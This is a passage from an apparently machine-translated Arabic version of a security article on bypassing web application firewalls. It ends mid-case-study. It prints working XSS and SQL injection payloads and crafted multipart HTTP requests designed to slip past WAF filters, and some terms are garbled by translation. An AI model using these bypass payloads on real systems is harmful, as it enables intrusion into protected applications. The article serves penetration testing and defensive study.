class="hljs-name">svg</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">confirm(1)</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><h4 style=";text-align:right;direction:rtl">  تغيير الترميز </h4><br>  تعتمد هذه الطريقة على استخدام ترميزات مختلفة لمنع WAF من فك تشفير البيانات في أماكن معينة.  على سبيل المثال ، إذا تم استبدال رمز برمز URL الخاص به ، فلن يتمكن WAF من فهم أنه يجب فك تشفير البيانات وسيتم تمرير الطلب.  في الوقت نفسه ، سيتم قبول المعلمة نفسها وفك تشفيرها بنجاح من خلال تطبيق الويب. <br><br>  الشكل العشري لرمز HTML هو <b>&amp; # 106</b> أو <b>&amp; # 0000106.</b> قد يعرف WAF عن الإصدار القصير ولا يعرف عن الإصدار مع الأصفار الإضافية (يجب ألا يزيد مجموع الرموز عن 7 رموز).  بالطريقة نفسها ، يكون الشكل السداسي لرمز HTML هو <b>&amp; # x6A</b> أو <b>&amp; # x000006A</b> . <br><br>  هناك أيضًا خدعة بها حروف متجاوزة بخط مائل عكسي <b>\</b> ، على سبيل المثال: <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">on</span></span></span><span class="hljs-tag">\</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">load</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">a\lert(1)</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  رغم ذلك ، يعتمد ذلك على كيفية معالجة تطبيق الويب لبيانات الإدخال هذه.  لذلك ، سيتم معالجة التسلسل <b>\ l</b> كرمز وتحويله إلى رمز واحد ؛  يمكن لـ WAF معالجة كل رمز على حدة ويمكنه كسر التعبيرات العادية أو منطق WAF آخر.  وبالتالي ، سوف يغيب WAF الكلمات الرئيسية.  باستخدام هذه التقنية ، لا يمكننا الهروب من الشخصيات <b>\ n</b> ، <b>\ r</b> ، <b>\ t</b> ، حيث سيتم تحويلها إلى أحرف مختلفة: سطر جديد ، حرف إرجاع ، وعلامة تبويب. <br><br>  يمكن استخدام ترميز HTML داخل سمات العلامات ، على سبيل المثال: <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript&amp;colon;alert(1)"</span></span></span><span class="hljs-tag">&gt;</span></span>clickme<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">input</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onmouseover</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript&amp;colon;confirm&amp;lpar;1rpar;"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  يمكن استبدال هذه الأحرف بسهولة بتمثيلات HTML أخرى للأحرف المستهدفة.  يمكنك البحث عن تحويلات مختلفة من الشخصيات <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">هنا</a> . <br><br>  إلى جانب ترميز HTML ، يمكننا إدراج أحرف مع <b>\ u</b> : <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"javascript:\u0061lert(1)"</span></span></span><span class="hljs-tag">&gt;</span></span>Clickme<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">svg</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">confir\u006d(1)</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  لنلقِ نظرة أيضًا على المتجه المتعلق بإدخال حرف خاص.  دعنا نكسر الحمولة الصافية باستخدام ترميز HTML: <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"ja&amp;Tab;vas&amp;#x0000A;cript:alert(1)"</span></span></span><span class="hljs-tag">&gt;</span></span>clickme<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  في هذه الحالة ، يمكننا أيضًا وضع أحرف فاصلة أخرى. <br><br>  وبالتالي ، نوصي بدمج ترميزات مختلفة مع طرق أخرى ، على سبيل المثال ، لتشفير الأحرف الخاصة. <br><br><h4 style=";text-align:right;direction:rtl">  البحث عن الهياكل النحوية المكافئة غير التقليدية </h4><br>  تهدف هذه الطريقة إلى إيجاد طريقة للاستغلال لا يعتبرها مطورو WAF ، أو متجهًا غير موجود في نموذج التدريب على التعلم الآلي.  أمثلة بسيطة ستكون وظائف JavaScript: <b>هذا ، صورة ذاتية ، أصل ، إطارات ؛</b>  سمات العلامات: <b>ربط البيانات ، ontoggle ، onfilterchange ، onbeforescriptexecute ، onpointerover ، srcdoc؛</b>  عوامل تشغيل SQL: <b>lpad ، الحقل ، bit_count</b> . <br><br>  فيما يلي بعض الأمثلة: <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">[</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'alert'</span></span></span><span class="javascript">](</span><span class="hljs-number"><span class="javascript"><span class="hljs-number">0</span></span></span><span class="javascript">)</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript">parent[</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'alert'</span></span></span><span class="actionscript">](</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">1</span></span></span><span class="actionscript">)</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript">self[</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'alert'</span></span></span><span class="actionscript">](</span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">2</span></span></span><span class="actionscript">)</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">LPAD</span></span>(<span class="hljs-string"><span class="hljs-string">' '</span></span>,<span class="hljs-number"><span class="hljs-number">4</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">version</span></span>())=<span class="hljs-string"><span class="hljs-string">'5.7'</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">sleep</span></span>(<span class="hljs-number"><span class="hljs-number">5</span></span>),<span class="hljs-literal"><span class="hljs-literal">null</span></span>);</code> </pre> <br>  يمكنك أيضًا استخدام التمثيل غير الرمزي لتعبيرات JavaScript: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">JSFuck</a> </li><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Jjencode</a> . </li><li style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Xchars.js</a> . </li></ul><br>  مشكلة واضحة في ذلك هي الحمولات الطويلة. <br><br>  WAF الالتفافية مع هذه التقنية يعتمد على الهجوم ومجموعة مكدسة من التقنيات.  يعد استغلال ImageTragick الشهير مثالاً جيدًا على ذلك.  أدرجت معظم WAFs التي تحمي من هذا الهجوم كلمات رئيسية مثل <b>url</b> ، <b>والسعة</b> ، <b>والتسمية</b> ، حيث تم ذكر تلك الكلمات في غالبية الأوراق ونقاط الاتصال التي تصف مشكلة عدم الحصانة هذه.  على الرغم من أنه سرعان ما تم الكشف عن إمكانية استخدام كلمات رئيسية أخرى أيضًا ، على سبيل المثال ، <b>سريعة الزوال</b> و <b>pango</b> .  نتيجة لذلك ، يمكن تجاوز WAFs باستخدام هذه الكلمات الرئيسية. <br><br><h4 style=";text-align:right;direction:rtl">  تلوث معلمة HTTP (HPP) وتجزئة معلمة HTTP (HPF) </h4><br>  يعتمد هجوم HPP على كيفية قيام الخادم بترجمة المعلمات بنفس الأسماء.  فيما يلي بعض تجاوزات المحتملة: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  يستخدم الخادم المعلمة المستلمة الأخيرة ، ويفحص WAF فقط المعلمة الأولى ؛ </li><li style=";text-align:right;direction:rtl">  يوحد الخادم القيمة من معلمات مشابهة ، ويقوم WAF بفحصها بشكل منفصل. </li></ul><br>  يمكنك مقارنة كيفية معالجة الخوادم المختلفة للمعلمات نفسها في الجدول أدناه: <br><br><img src="https://habrastorage.org/webt/59/e3/77/59e3770e949f3269504620.png"><br><br>  بدوره ، يعتمد هجوم HPF على مبدأ مختلف.  إذا كان منطق تطبيق الويب يوحد معلمتين أو أكثر في طلب ما ، يمكن للخصم تقسيم الطلب لتجاوز بعض اختبارات WAF. <br>  حقن SQL التالي هو مثال على مثل هذا الهجوم: <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml">http://test.com/url?a=1+select&amp;b=1+from&amp;c=base</code> </pre> <br>  HPF و HPP متشابهان للغاية ، لكن الأول يستهدف تطبيق ويب ، والأخير هو البيئة التي يعمل فيها.  الجمع بين هذه التقنيات يزيد من فرصة تجاوز WAF. <br><br><h4 style=";text-align:right;direction:rtl">  تطبيع يونيكود </h4><br>  Unicode Normalization هي إحدى ميزات Unicode المخصصة لمقارنة رموز Unicode التي تبدو متشابهة.  على سبيل المثال ، تحتوي الرموز <b>"ª"</b> و <b>"ᵃ"</b> على رموز مختلفة ولكنهما متشابهان للغاية على خلاف ذلك ، لذلك بعد التطبيع سيبدو كلاهما بسيطًا <b>"a"</b> <b>ويعتبران متماثلين</b> .  يتيح التطبيع تحويل بعض رموز Unicode المعقدة إلى بدائل أبسط.  هناك <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">جدول تطبيع Unicode</a> مع جميع رموز Unicode وتطبيعاتها المحتملة.  باستخدامه ، يمكنك إنشاء حمولات مختلفة ودمجها مع طرق أخرى.  على الرغم من أنه لا يعمل مع جميع تطبيقات الويب ويعتمد بشكل كبير على البيئة. <br><br>  على سبيل المثال ، في الجدول أعلاه ، يمكننا أن نرى أن الرموز <b><code>＜</code></b> و <b><code>﹤</code></b> تتحول إلى <b><code>&lt;</code></b> بسيطة.  إذا كان أحد التطبيقات يستخدم تشفير HTML بعد التطبيع ، فمن المرجح أن يكون رمز التطبيع <b><code>&lt;</code></b> سيتم ترميزه في <b><code>&amp;lt;</code></b>  .  ولكن ، في حالات أخرى ، ربما تجاهل المطورون هذه الميزة وليس رموز Unicode المشفرة.  وبالتالي ، نحصل على رموز غير مشفرة بتنسيق HTML <b>&lt;</b> و <b>&gt;</b> ، والتي يمكن تحويلها إلى هجوم XSS.  قد تواجه WAF مشكلة في فهم رموز Unicode - قد لا تحتوي ببساطة على قواعد لهذه الحيل ، وقد يكون التعليم الآلي عديم الفائدة أيضًا.  أثناء العثور على تجاوز في تطبيقات الويب مع تطبيع Unicode ، يمكننا استبدال ليس فقط <b>&lt;&gt;</b> بل الرموز الأخرى من الحمولة النافعة أيضًا. <br><br>  على سبيل المثال: <br><br><pre style=";text-align:right;direction:rtl"> <code class="html hljs xml">＜img src﹦x onerror＝alert︵1)&gt;</code> </pre> <br>  في الآونة الأخيرة ، تم العثور على هذه المشكلة في برنامج Rockstar BugBounty في HackerOne.  لم يكن هناك WAF ، فقط تصفية إدخال المستخدم صارمة: <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">hackerone.com/reports/231444</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">hackerone.com/reports/231389</a> <br><br><h4 style=";text-align:right;direction:rtl">  قواطع رمزية </h4><br>  تحاول الهجمات على الرموز الرمزية كسر منطق تقسيم الطلب إلى الرموز بمساعدة ما يسمى بمكسرات الرموز الرمزية.  قواطع الرمز هي رموز تسمح بالتأثير على المراسلات بين عنصر سلسلة ورمز معين ، وبالتالي تجاوز البحث بالتوقيع.  ولكن عند استخدام الرمز المميز ، يجب أن يظل الطلب صالحًا.  الطلب التالي هو مثال على الهجوم باستخدام أداة كسر الرمز المميز <br><br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span>-@<span class="hljs-number"><span class="hljs-number">1</span></span>,<span class="hljs-keyword"><span class="hljs-keyword">version</span></span>()</code> </pre> <br>  حيث <b>- @</b> هو الكسارة الرمزية. <br><br>  هناك <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ورقة chear</a> التي تم الحصول عليها بواسطة mysql fuzzing والتحقق من النتائج في libinjection. <br><br>  المزيد عن العثور على مشاكل في libinjection: <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">طنان آخر</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">زغب لتجاوز</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">كيفية تجاوز libinjection</a> <br><br><h4 style=";text-align:right;direction:rtl">  باستخدام ميزات RFC </h4><br>  في مواصفات بروتوكول HTTP / 1.1 وأنواع الطلبات المختلفة (مثل البيانات متعددة الأجزاء / النماذج) ، يمكننا أن نجد بعض الأشياء الغريبة المتعلقة بحالات الحدود وحيل معالجة الرؤوس والمعلمات.  لا ينظر مطورو WAF غالبًا في مثل هذه المشكلات ، وبالتالي قد يقوم WAF بتحليل الطلب بشكل غير صحيح ويفتقد جزء البيانات ، حيث يتم إخفاء متجه الهجوم.  ترتبط معظم المشكلات في WAFs بمعالجة البيانات متعددة الأجزاء / والقيم المحددة للمعلمة الحدودية ، والتي تحدد حدود المعلمات في مثل هذه الطلبات.  بالإضافة إلى ذلك ، قد يخطئ مطورو الخادم كذلك ولا يدعمون المواصفات تمامًا ، لذلك قد تكون هناك ميزات غير موثقة في محلل HTTP للخادم. <br><br>  في طلب HTTP مع بيانات متعددة الأجزاء / النماذج ، تكون حدود المعلمة مسؤولة عن فصل المعلمات المختلفة في نص الطلب.  وفقًا لـ RFC ، يجب وضع حدود محددة مسبقًا مع بادئة تحتوي على "-" قبل كل معلمة POST جديدة ، حتى يتمكن الخادم من تمييز المعلمات المختلفة لطلب ما. <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">POST /vuln.php HTTP/1.1 Host: test.com Connection: close Content-Type: multipart/form-data; boundary=1049989664 Content-Length: 192 --1049989664 Content-Disposition: form-data; name="id" 287356 --1049989664--</code> </pre> <br>  قد يعتمد الهجوم أيضًا على حقيقة أن الخادم و WAF يتعاملان بشكل مختلف مع موقف يتم فيه ترك الحدود فارغة.  وفقًا لـ RFC ، في هذه الحالة ، "-" هي الحدود بين المعلمات.  ومع ذلك ، قد تستخدم WAF محللًا لا يراعي ذلك ، ونتيجة لذلك ، فإن WAF سوف يجتاز الطلب لأن البيانات من معلمات طلب POST لن تظهر في المحلل.  يمكن لخادم الويب تحليل مثل هذا الطلب دون مشاكل وتسليم البيانات لمزيد من المعالجة. <br>  فيما يلي بعض الأمثلة الأكثر إثارة للاهتمام. <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">POST /vuln.php HTTP/1.1 Host: test.com Connection: close Content-Type: multipart/form-data; boundary= Content-Length: 192 -- Content-Disposition: form-data; name="id" 123' or sleep(20)# ----</code> </pre> <br>  سنقدم بعض الأمثلة الأكثر إثارة للاهتمام من <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">الشرائح</a> التي كتبها <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Bo0oM</a> في ZeroNights 2016 ونوضح ذلك: <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">POST /vuln.php HTTP/1.1 Host: test.com Content-Type: multipart/form-data; boundary=FIRST; Content-Type: multipart/form-data; boundary=SECOND; Content-Type: multipart/form-data; boundary=THIRD; --THIRD Content-Disposition: form-data; name=param UNION SELECT version() --THIRD--</code> </pre><br>  في هذا الهجوم ، نحاول تحديد أي من معلمات الحدود سيتم قبولها بواسطة WAF وأيها خادم الويب.  وبالتالي ، إذا قبلوا المعلمات المختلفة ، فمن الممكن القيام بهجوم من خلال تحديد الحدود التي لن يراها WAF.  هذا الهجوم يشبه إلى حد ما HPP. <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">POST /vuln.php HTTP/1.1 Host: test.com Content-Type: multipart/form-data; xxxboundaryxxx=FIRST; boundary=SECOND; --FIRST Content-Disposition: form-data; name=param UNION SELECT version() --FIRST--</code> </pre><br>  يعتمد هذا الهجوم على افتراض وجود اختلاف في تحليل طلب HTTP بواسطة WAF وخادم الويب.  وهي ، محلل خادم الويب يبحث عن الإدخال "الحد" الأول ، ثم عن الرمز "=" ، وبعد ذلك فقط يحدد قيمة الحدود.  محلل WAF ، بدوره ، يبحث فقط عن إدخال "الحدود =" ثم يحدد الحدود.  إذا تم استيفاء هذه الشروط ، فلن تجد WAF الحد في الطلب ، وبالتالي لن تتمكن من العثور على المعلمة وتحليلها.  على العكس من ذلك ، سيحصل خادم الويب على الطلب ويعالج المعلمة.  سوف يعمل هذا الهجوم أيضًا في الاتجاه الآخر: يبحث محلل خادم الويب عن "الحدود" ، ويبحث محلل WAF عن "الحدود" فقط.  في هذه الحالة ، سيتعين علينا فقط تغيير الحدود الحقيقية من الأول إلى الثاني. <br><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">POST /somepage.php HTTP/1.1 Host: test.com Content-Type: multipart/form-data; boundary=Test0x00othertext; --Test Content-Disposition: form-data; name=param Attack --Test--</code> </pre><br>  يستخدم هذا الهجوم أيضًا أحرفًا خاصة.  في المعلمة الحدودية ، أضفنا NULL بايت (بايت) بحيث يقوم خادم الويب بقطعها ، لكن WAF سوف يقبلها بالكامل.  في هذه الحالة ، لا يمكن لـ WAF تحليل المعلمة لأنها لا تستطيع العثور على حدودها. <br><br><h4 style=";text-align:right;direction:rtl">  تجاوز التعلم الآلي </h4><br>  المنطق بسيط: علينا أن نؤلف هجومًا يفي بمعايير النموذج الإحصائي المدرب.  ولكن هذا يعتمد إلى حد كبير على كيفية تدريب WAF ونموذج التدريب الذي تم استخدامه.  أحيانًا يكون من الممكن العثور على ثغرة ، وأحيانًا لا يكون ذلك ممكنًا.  عادة ، في مرحلة التنفيذ ، تحتاج WAF مع التعلم الآلي إلى تدريب إضافي بناءً على طلب تطبيق الويب الخاص بالعميل.  يمثل ذلك مشكلة بالنسبة للمخترعين: لا يمكن اختبار المعلمات التي تبدو متشابهة ولا تتغير كثيرًا من طلب إلى آخر ، حيث يُعتبر أي انحدار من نموذج المعلمة المعتاد حالة شاذة.  دعنا نقول الطريقة التي لديها طلب ل <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">api.test.com/getuser؟id=123</a></b> .  معرف المعلمة دائمًا ما يكون رقميًا ، وكان رقميًا في نموذج التدريب.  إذا وجدت وحدة التعلم الآلي شيئًا إلى جانب الأرقام في هذه المعلمة ، فستقرر على الأرجح أنها حالة شاذة.  مثال آخر: افترض أنه تم تدريب WAF لتصنيف طلب POST إلى <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">api.test.com/setMarkDown</a></b> مع معلمات POST التي تحتوي على نص تخفيض السعر.  من الواضح ، قد تكون هناك علامات اقتباس ورموز خاصة وأي شيء أساسي في تخفيض السعر.  في هذه الحالة ، من الأسهل تجاوز وحدة التعلم الآلي لأن WAF تتسامح مع علامات الاقتباس والرموز الخاصة. <br><br>  بالإضافة إلى ذلك ، بناءً على الأمثلة من ممارستنا ، سنظهر أنها لا تصل دائمًا إلى حد وحدة التعلم الآلي نظرًا لمشاكل تحليل المعلمات الناتجة عن طرق الالتفافية الموضحة أعلاه. <br><br>  بشكل عام ، يتعين علينا النظر في تفاصيل الطلب الذي تم اختباره ومعلماته ، ونفترض أي خيارات ممكنة لقيم المعلمات ، والتي قد يكون WAF متسامحًا معها ، والبناء عليها. <br><br><h4 style=";text-align:right;direction:rtl">  عندما WAF لا طائل منه؟ </h4><br>  يقوم WAF بتحليل الطلبات ويبحث عن سلوك شاذ فيها ، لكن هناك بعض فئات الثغرات الأمنية التي لا يمكن اكتشافها.  على سبيل المثال ، نقاط الضعف المنطقية ، التي ليس لديها شذوذ ولكن لديها بعض الإجراءات التي تعطل منطق تطبيق الويب.  على الأرجح ، ستكون WAF عديمة الفائدة أيضًا في حالة حالة السباق ، و IDOR ، ومصادقة المستخدم غير الآمنة. <br><br><h4 style=";text-align:right;direction:rtl">  المرافق الحالية </h4><br>  هناك بعض الأدوات التلقائية للعثور على تجاوزات WAF ، كتبها المتحمسين في هذا المجال.  وهنا الأكثر شهرة وتستحق: <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">lightbulb-framework</a> - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">إطار</a> كامل لاختبار تطبيقات الويب المحمية باستخدام WAF.  هو مكتوب على بيثون واستدار بالإضافة إلى ذلك كمكون إضافي لبرنامج Burp Suite.  معالمه الرئيسية هي هذه الخوارزميات اثنين: <br><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  GOFA - خوارزمية نشطة للتعلم الآلي تتيح تحليل الترشيح وتعقيم المعلمات في تطبيق ويب. </li><li style=";text-align:right;direction:rtl">  SFADiff - خوارزمية اختبار الصندوق الأسود التفضيلي ، استنادًا إلى التدريب باستخدام automat رمزي محدود (SFA).  يسمح بالعثور على اختلافات في سلوك تطبيقات الويب مما يساعد على تحديد WAF والعثور على تجاوز. </li></ul><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">تجاوز WAF</a> - مكون إضافي لـ Burp Suite ، والذي يسمح بإعداد تغيير تلقائي للعناصر في نص الطلب وفقًا لقواعد مختلفة وتغييرات الترميز.  كما يمكن أتمتة هجوم HPP. <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">WAFW00F</a> - أداة لتحديد WAF ، مكتوبة على بيثون.  لديها قاعدة WAF لائقة وما زالت قيد التحديث.  على الرغم من أن النتائج قد تكون غير دقيقة لأن العديد من WAFs يتم تحديثها بشكل متكرر أكثر من المشروع نفسه. <br><br><h2 style=";text-align:right;direction:rtl">  تجاوز waf في الممارسة العملية </h2><br><img src="https://habrastorage.org/webt/59/e4/fc/59e4fc4eee061363676501.png"><br><br>  لقد تم تشغيل اختبار الاختراق لمتجر عبر الإنترنت ، والذي كان محميًا بواسطة <b>PT AF</b> (جدار حماية التطبيقات الإيجابية للتكنولوجيا).  كان من الصعب العثور على بقعة ضعيفة ، والتي يمكن أن تكون قاعدة لتجاوز.  ولكن سرعان ما اكتشفنا سلوكًا غير عادي على جانب تطبيق الويب ، والذي لم تتم تصفيته بواسطة WAF.  تم العثور على الشذوذ في البحث في تاريخ البضائع المشتراة.  تم إرسال الطلب بتنسيق JSON وبدا كما يلي: <br><br><pre style=";text-align:right;direction:rtl"> <code class="json hljs">{<span class="hljs-attr"><span class="hljs-attr">"request"</span></span>:{<span class="hljs-attr"><span class="hljs-attr">"Count"</span></span>:<span class="hljs-number"><span class="hljs-number">10</span></span>,<span class="hljs-attr"><span class="hljs-attr">"Offset"</span></span>:<span class="hljs-number"><span class="hljs-number">0</span></span>,<span class="hljs-attr"><span class="hljs-attr">"ItemName"</span></span>:<span class="hljs-string"><span class="hljs-string">"Phone"</span></span>}}</code> </pre> <br>  وضعنا قيم <b>الهاتف والهاتف</b> في المعلمة <b>ItemName</b> ووجدنا أن الخادم يعرض استجابات مختلفة لهذين الطلبين.  في الحالة الأولى ، كان الرد فارغًا ؛  في الحالة الثانية ، احتوى على بيانات عن البضائع الأخرى مع كلمة <b>الهاتف</b> باسمهم ، كما لو كانت المعلمة <b>ItemName</b> تحتوي على <b>الهاتف</b> كقيمة له.  هذا النوع من السلوك معروف بين المتسللين والمثقفين ويشير إلى وجود مشكلة في التطبيق مع ترشيح إدخال المستخدم ، مما يؤدي إلى حقن SQL من بين آخرين. <br><br>  دعونا نرى لماذا يحدث هذا مع مثال حقن SQL.  إذا تم العثور على مثل هذا السلوك في تطبيق ويب ، فمن المحتمل جدًا أن تكون بيانات طلب SQL متسلسلة مع الطلب نفسه.  في الحالة الأولى ، باستخدام معلمة <b>الهاتف</b> ، سيكون لدينا استعلام SQL التالي: <br><br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> item <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> items <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> item_name=<span class="hljs-string"><span class="hljs-string">'Phone''</span></span></code> </pre> <br>  من الواضح أنه لن يتم تنفيذه بسبب بناء جملة غير صحيح ولن يعرض أي نتيجة.  الطلب الثاني ، مع معلمة <b>الهاتف "+"</b> ، سيبدو كما يلي: <br><br><pre style=";text-align:right;direction:rtl"> <code class="sql hljs"><span class="hljs-keyword"><span class="hljs-keyword">SELECT</span></span> item <span class="hljs-keyword"><span class="hljs-keyword">FROM</span></span> items <span class="hljs-keyword"><span class="hljs-keyword">WHERE</span></span> item_name=<span class="hljs-string"><span class="hljs-string">'Phone'</span></span>+<span class="hljs-string"><span class="hljs-string">''</span></span></code> </pre> <br>  بناء الجملة الخاص به صحيح ، 